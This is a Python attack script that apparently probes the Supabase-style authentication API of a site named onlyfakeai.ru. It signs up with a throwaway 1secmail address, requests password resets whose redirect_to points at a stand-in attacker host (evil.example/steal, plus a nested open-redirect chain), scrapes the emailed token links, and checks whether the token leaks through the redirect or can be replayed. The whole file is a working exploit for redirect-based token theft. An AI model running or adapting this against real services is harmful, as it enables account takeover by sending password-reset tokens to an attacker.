import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time, random, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"

def req(method, url, body=None, token=None, extra=None, follow=True):
    h = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    class NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k): return None
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler() if follow else NoRedir)
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, str(e)

# ---------- 1. temp mailbox ----------
login = "authflow" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
domain = "1secmail.com"
email = f"{login}@{domain}"
print("temp email:", email)

def inbox():
    u = f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}"
    st, hd, b = req("GET", u)
    try:
        return json.loads(b)
    except Exception:
        return {"raw": b[:200], "status": st}

msgs = inbox()
print("inbox initial:", msgs)

# ---------- 2. signup with temp email ----------
pw = "Zq7#vL2!mX9$wR4"
st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": email, "password": pw}, extra={"apikey": KEY})
print("signup:", st, b[:160])
sess = {}
try:
    sess = json.loads(b)
except Exception:
    pass
SIGNUP_TOKEN = sess.get("access_token")
UID = (sess.get("user") or {}).get("id")
print("uid:", UID, "token:", bool(SIGNUP_TOKEN))

# ---------- 3. recover with nested open-redirect redirect_to ----------
deep = "https://onlyfakeai.ru/login?redirect=https%3A%2F%2Fevil.example%2Fpwn"
st, hd, b = req("POST", SUPA + "/auth/v1/recover", {"email": email, "redirect_to": deep}, extra={"apikey": KEY})
print("recover(redirect_to=deep link):", st, b[:200])
time.sleep(2)
st, hd, b = req("POST", SUPA + "/auth/v1/recover", {"email": email, "redirect_to": "https://evil.example/steal"}, extra={"apikey": KEY})
print("recover(redirect_to=evil):", st, b[:200])

# ---------- 4. poll inbox ----------
found = []
for i in range(20):
    time.sleep(4)
    msgs = inbox()
    if isinstance(msgs, list) and msgs:
        found = msgs
        break
    print(f"  poll {i+1}: {msgs if not isinstance(msgs,list) else len(msgs)}")
print("messages:", json.dumps(found)[:600] if found else "NONE")

links = []
if found:
    for m in found[:4]:
        mid = m.get("id")
        st, hd, b = req("GET", f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={mid}")
        try:
            msg = json.loads(b)
        except Exception:
            continue
        print(f"\n--- message {mid}: from={msg.get('from')} subject={msg.get('subject')} date={msg.get('date')}")
        bodytxt = (msg.get("textBody") or "") + "\n" + (msg.get("htmlBody") or "")
        for u in re.findall(r"https?://[^\s\"'<>]+", bodytxt):
            if "auth/v1/verify" in u or "token=" in u:
                links.append(u)
        for u in links:
            print("  VERIFY LINK:", u)
        print("  body excerpt:", bodytxt[:900].replace("\n", " "))

# ---------- 5. click the recovery link ----------
for u in links[:2]:
    print("\n== GET verify link ==")
    st, hd, b = req("GET", u, extra={"apikey": KEY}, follow=False)
    loc = hd.get("Location") or hd.get("location") or ""
    print("status:", st, "Location:", loc[:400])
    st2, hd2, b2 = req("GET", u, extra={"apikey": KEY}, follow=False)
    print("replay status:", st2, "body:", b2[:160])

if SIGNUP_TOKEN:
    st, hd, b = req("GET", SUPA + "/auth/v1/user", token=SIGNUP_TOKEN, extra={"apikey": KEY})
    print("\ntemp account user endpoint:", st, b[:120])
